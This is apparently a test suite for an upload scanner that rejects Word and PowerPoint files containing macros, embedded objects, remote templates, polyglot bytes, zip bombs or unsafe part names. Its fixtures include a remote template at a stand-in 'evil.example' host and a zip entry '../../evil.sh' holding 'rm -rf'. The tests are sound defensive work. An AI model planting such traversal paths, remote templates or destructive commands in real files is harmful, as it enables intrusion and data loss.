import { describe, expect, test } from "bun:test";
import { buildDocx, buildPptx, buildZip } from "@studafy/test-support";
import {
  analyzeBytes,
  detectOoxmlMediaType,
  DOCX_MEDIA_TYPE,
  EICAR_SIGNATURE,
  parseOoxml,
  PPTX_MEDIA_TYPE,
} from "../src";

/**
 * Word and PowerPoint uploads (ADR-0037). A lesson file is accepted only as
 * plain document parts: no macros, no embedded objects, nothing fetched
 * from elsewhere when it opens, and nothing that inflates without bound.
 */
describe("Office documents", () => {
  const docx = () =>
    buildDocx([{ heading: "Cells" }, {
      paragraph: "A cell is the unit of life.",
    }]);

  test("a plain Word file and a plain slide deck are clean", async () => {
    expect(detectOoxmlMediaType(docx())).toBe(DOCX_MEDIA_TYPE);
    const deck = buildPptx([{ title: "Cells", lines: ["Nucleus"] }]);
    expect(detectOoxmlMediaType(deck)).toBe(PPTX_MEDIA_TYPE);
    expect(await analyzeBytes(docx(), DOCX_MEDIA_TYPE)).toEqual({
      verdict: "clean",
    });
    expect(await analyzeBytes(deck, PPTX_MEDIA_TYPE)).toEqual({
      verdict: "clean",
    });
  });

  test("a Word file declared as slides is refused", async () => {
    expect((await analyzeBytes(docx(), PPTX_MEDIA_TYPE)).verdict).toBe(
      "malformed",
    );
  });

  test("any other ZIP is not an accepted type", () => {
    expect(
      detectOoxmlMediaType(buildZip([{ name: "notes.txt", data: "hi" }])),
    ).toBeNull();
  });

  test("macros are refused, by part and by content type", () => {
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          extraParts: [{ name: "word/vbaProject.bin", data: "macro" }],
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          extraContentTypes:
            '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>',
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
  });

  test("embedded objects and ActiveX are refused", () => {
    expect(
      parseOoxml(
        buildPptx([{ title: "x" }], {
          extraParts: [{ name: "ppt/embeddings/oleObject1.bin", data: "ole" }],
        }),
        "pptx",
      ),
    ).toEqual({ ok: false, reason: "embedded" });
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          extraParts: [{ name: "word/activeX/activeX1.xml", data: "<x/>" }],
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
  });

  test("a remote template is refused; an ordinary hyperlink is kept", () => {
    const rels = (type: string) =>
      `<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`;
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          documentRels: rels("attachedTemplate"),
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "external_reference" });
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], { documentRels: rels("hyperlink") }),
        "docx",
      ).ok,
    ).toBe(true);
  });

  test("the EICAR test file inside a part is malicious", async () => {
    const infected = buildDocx([{ paragraph: EICAR_SIGNATURE }]);
    expect(await analyzeBytes(infected, DOCX_MEDIA_TYPE)).toEqual({
      verdict: "malicious",
      errorCode: "malware_detected",
    });
  });

  test("bytes before or after the ZIP make it a polyglot", () => {
    const file = docx();
    const appended = new Uint8Array([...file, 0x25, 0x50, 0x44, 0x46]);
    expect(parseOoxml(appended, "docx")).toEqual({
      ok: false,
      reason: "polyglot",
    });
  });

  test("a part that inflates far past its size is a bomb", () => {
    const bomb = buildDocx([{ paragraph: "x" }], {
      extraParts: [{ name: "word/big.xml", data: "a".repeat(5_000_000) }],
    });
    expect(parseOoxml(bomb, "docx")).toEqual({
      ok: false,
      reason: "decompression_limit",
    });
  });

  test("a part whose size lies is malformed", () => {
    const file = docx();
    // Raise the first central-directory entry's uncompressed size by one.
    const forged = file.slice();
    const first = forged.findIndex((_, i) =>
      forged[i] === 0x50 && forged[i + 1] === 0x4b &&
      forged[i + 2] === 0x01 && forged[i + 3] === 0x02
    );
    expect(first).toBeGreaterThan(0);
    forged[first + 24] = (forged[first + 24]! + 1) & 0xff;
    expect(parseOoxml(forged, "docx").ok).toBe(false);
  });

  test("unsafe part names are refused", () => {
    const traversal = buildZip([
      { name: "[Content_Types].xml", data: "<Types/>" },
      { name: "word/document.xml", data: "<w:document/>" },
      { name: "../../evil.sh", data: "rm -rf" },
    ]);
    expect(parseOoxml(traversal, "docx")).toEqual({
      ok: false,
      reason: "malformed",
    });
  });
});
